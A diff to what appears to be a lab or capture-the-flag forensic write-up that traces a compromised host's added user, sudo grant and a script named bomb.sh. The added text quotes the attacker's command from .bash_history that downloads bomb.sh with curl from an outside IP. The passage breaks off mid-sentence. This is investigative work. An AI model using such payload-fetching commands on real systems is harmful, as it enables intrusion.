@@ -15,6 +15,5 @@ The package they installed was named dokuwiki, which is an opensource wiki softw
 User created - it-admin
 Date sudo was given - Dec 28 06:27:34
 Script file name - bomb.sh
-
 ```
-To find more information on bomb.sh, I will be looking in the .bash_history file. 
+To find more information on bomb.sh, I will be looking in the .bash_history file. The command used to created the file was curl 10.10.158.38:8080/bomb.sh --output bomb.sh. the file was then renamed and moved to  
